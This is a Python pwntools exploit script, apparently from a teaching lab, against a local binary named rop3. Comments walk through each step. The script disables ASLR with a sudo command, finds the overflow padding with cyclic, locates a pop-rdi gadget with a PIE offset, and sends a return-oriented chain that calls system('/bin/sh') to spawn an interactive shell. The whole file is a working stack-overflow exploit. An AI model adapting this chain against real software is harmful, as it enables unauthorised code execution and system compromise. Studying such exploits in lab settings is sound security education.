# WARNING: requires the command 'echo 0 | sudo tee /proc/sys/kernel/randomize_va_space' to be exectued

from pwn import *

# the following command opens a new terminal in tmux with gdb attached to the process;
# this is useful in the first phase of debugging

# context.terminal = ["tmux", "splitw", "-h"]

# the following line tells to the pwntools library to print debug messages;
# in particular, sent / received messages will be printed

context.log_level = "debug"

# it is suggested to first analyse the binary with gdb, and only after to craft and
# directly send the payload

# p = gdb.debug('../target/rop3', '''b main
# c
# ''')
p = process('../target/rop3')

# the command 'p system' reveals the address of the 'system' function

system_addr = 0x7ffff7a31550

# the binary contains the string "/bin/sh"

bin_sh_addr = 0x7ffff7b95e1a

# we need a ROP gadget to set the argument of the 'system' function
# the pwntools library has what is needed

elf = ELF('../target/rop3')
rop = ROP(elf)

# we need to add an offset to address the PIE countermeasure of this binary
# (look at the checksec output)

gadget_addr = 0x555555400000 + rop.rdi[0] # pop rdi: ret

# with the 'cyclic' tool and gdb, it is easy to find the length of the padding
# looking at the address where the binary crashes:

# p.sendline(cyclic(0x200))
# the address is the hexadecimal value for 'qaac'

padding_len = cyclic_find(b'qaac')

# the missing step is to assemble the ROP chain

payload  = b'A' * padding_len
payload += p64(gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(0x00005555554006d0) # additional 'ret' to align the stack
payload += p64(system_addr) # system
p.sendline(payload)
p.interactive()
